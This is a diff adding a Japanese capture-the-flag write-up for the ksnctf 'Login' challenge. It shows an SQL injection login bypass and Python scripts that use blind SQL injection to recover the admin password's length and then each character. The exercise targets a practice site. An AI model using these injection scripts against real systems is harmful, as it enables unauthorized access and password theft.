@@ -117,6 +117,73 @@ begin 666 で調べたら、Base64の一つ前の形式であるuuencodeなる�
 
 ---
 
+## Q6 「 Login」
+
+![ksnctf-q6.png](ksnctf-q6.png)
+
+早速、URL先に飛びました。
+
+「First, login as "admin".」ということで、見るからにSQLインジェクションですね。
+
+ということで初っ端から、
+
+`ID：admin , Pass：' or 1=1 --`  を入力してみました。
+
+すると、「Congratulations!　It's too easy?　Don't worry.　The flag is admin's password.」 と言われました。
+
+adminのパスワードがFlagのようですね。
+
+手順として、下記を考えました。
+
+1. adminのパスワードの文字列を特定 
+2. adminのパスワードを一文字目から一文字ずつ特定
+
+ということで、まず一つ目の手順を達するためにコードを書きました。
+
+- adminのパスワードの文字数を確認
+```Python
+import requests
+
+url = 'https://ctfq.u1tramarine.blue/q6/'
+
+# 文字数を確認
+for i in range(30):
+    sql = f"' or (SELECT LENGTH(pass) FROM user WHERE id = 'admin') = {i} --"
+    print(sql)
+    data = {"id": "admin", "pass": sql}
+    response = requests.post(url,data=data)
+    if 'Congratulations' in response.text:
+        print("文字列 → " + str(i))
+        break
+```
+
+次に二つ目の手順を達するためのコードを書きました。
+
+- adminのパスワードを一文字目から一文字ずつ特定
+```Python
+# 1文字ずつ確かめる
+checkString = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_'
+flag = ''
+
+for i in range(1,22):
+    for k in checkString:
+        # なぜか SUBSTRING では動かない
+        # SUBSTRING ( expression, start, length )  
+        sql = f"' or (SELECT substr(pass, {i}, 1) FROM user WHERE id = 'admin') = '{k}' --"
+        data = {"id": "admin", "pass": sql}
+        response = requests.post(url,data=data)
+        if 'Congratulations' in response.text:
+            flag += k
+            print(flag)
+            break
+```
+
+Flagを得ることができました。
+
+余談ですが、`SUBSTRING`で動くかなと思いましたが、なぜか動きませんでした。なぜだろう...
+
+---
+
 ## Q8 「Basic is secure?」
 
 ![ksnctf-q8.png](ksnctf-q8.png)
